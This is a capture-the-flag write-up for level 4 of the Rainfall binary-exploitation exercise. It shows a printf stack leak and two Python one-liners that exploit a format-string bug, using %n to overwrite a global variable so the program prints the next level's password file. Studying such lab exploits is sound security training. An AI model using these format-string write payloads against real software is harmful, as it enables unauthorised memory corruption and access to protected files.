# Rainfall - Level 4

## Executable Analyse

Program contain 3 functions: `main`, `n`, `p`, and contain a global m.  
`main`, call `n`, that call `p`.
Vulnerable function is in `n`, and execute *system("/bin/cat /home/user/level5/.pass");*  
Principe looks identic to the previous level, we need to set m == 16930116

```assembly
(gdb) info var
[...]
0x08049810  m
```

## Vulnerability

```shell
$> ./level4 
ABCD %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p

ABCD 0xb7ff26b0 0xbffff794 0xb7fd0ff4 (nil) (nil) 0xbffff758 0x804848d 0xbffff550 0x200 0xb7fd1ac0 0xb7ff37d0 0x44434241 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025
```

From the 12th address (`0x44434241`) we can see that printf receives the contents of our buffer as an argument.  
The same way we exploit the precedent program, this one can be abuse with :


```shell
python -c "print b'\x08\x04\x98\x10'[::-1] + '%20p'*10 + '%16929912p' + '%n'" | ./level4
```

A more elegant solution can be found by reading the [printf man](https://linux.die.net/man/3/printf) :
>  One can also specify explicitly which argument is taken [...] by writing "%m$" instead of '%', where the decimal integer m denotes the position in the argument list of the desired argument, indexed starting from 1.

```shell
python -c 'print "\x08\x04\x98\x10"[::-1] + "%16930112x" + "%12$n"' | ./level4
```